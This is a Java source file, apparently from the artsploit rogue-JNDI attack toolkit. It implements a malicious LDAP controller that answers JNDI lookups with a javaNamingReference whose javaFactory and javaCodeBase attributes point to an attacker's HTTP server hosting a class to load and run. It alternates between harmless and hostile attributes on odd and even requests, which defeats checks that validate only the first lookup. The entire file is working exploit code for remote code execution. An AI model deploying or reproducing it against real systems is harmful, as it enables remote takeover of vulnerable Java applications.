package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

/**
 * Modified from original RemoteReference implementation from artsploit
 * Returns different attributes on odd requests
*/

@LdapMapping(uri = { "/", "/o=toctou" })
public class RemoteReferenceTOCTOU implements LdapController {

    private String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/";

    private static int requestNo=0;
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        Entry e = new Entry(base);
        System.out.println("Sending LDAP reference result for " + classloaderUrl + "xExportObject.class");
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName", "xUnknown"); //could be any unknown
	if(requestNo++ % 2 != 0) {
		System.out.println("Sending disallowed attributes");
        	e.addAttribute("javaFactory", "xExportObject"); //could be any unknown
        	e.addAttribute("javaCodeBase", classloaderUrl);
	} else {
		System.out.println("Sending only allowed attributes");
	}
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
